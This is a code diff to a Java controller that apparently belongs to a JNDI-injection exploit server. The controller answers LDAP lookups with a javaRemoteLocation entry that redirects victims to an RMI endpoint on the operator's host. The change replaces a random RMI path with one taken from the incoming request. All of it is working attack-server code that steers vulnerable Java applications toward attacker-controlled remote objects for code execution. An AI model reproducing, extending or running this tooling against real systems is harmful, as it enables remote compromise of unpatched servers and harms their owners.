@@ -16,28 +16,20 @@ import java.util.Random;
 @LdapMapping(uri = {"/ldap2rmi"})
 public class ldap2rmiController implements LdapController {
 
-    private final  String     ip      = Config.ip;
-    private final  String     rmiPort = String.valueOf(Config.rmiPort);
+    private final String ip      = Config.ip;
+    private final String rmiPort = String.valueOf(Config.rmiPort);
+    private       String path;
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         System.out.println("- Change LDAP to RMI ");
 
-        Random        random = new Random();
-        StringBuilder sb     = new StringBuilder(5);
-
-        for (int i = 0; i < 5; i++) {
-            char letter = (char) (random.nextInt(26) + 'a');
-            sb.append(letter);
-        }
-
-        String randomLetters = sb.toString();
 
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "foo");
-        e.addAttribute("javaRemoteLocation", "rmi://" + ip + ":" + rmiPort + "/" + randomLetters);
+        e.addAttribute("javaRemoteLocation", "rmi://" + ip + ":" + rmiPort + path);
 
-        System.out.println(Ansi.ansi().fgBrightMagenta().a("  redirecting to: " + "rmi://" + ip + ":" + rmiPort + "/" + randomLetters).reset());
+        System.out.println(Ansi.ansi().fgBrightMagenta().a("  redirecting to: " + "rmi://" + ip + ":" + rmiPort + path).reset());
 
         result.sendSearchEntry(e);
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
@@ -45,6 +37,11 @@ public class ldap2rmiController implements LdapController {
 
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException, UnSupportedActionTypeException {
-
+        base = base.replace('\\', '/');
+        int index = base.indexOf('/');
+        if (index != -1) {
+            String result = base.substring(index);
+            path = result;
+        }
     }
 }
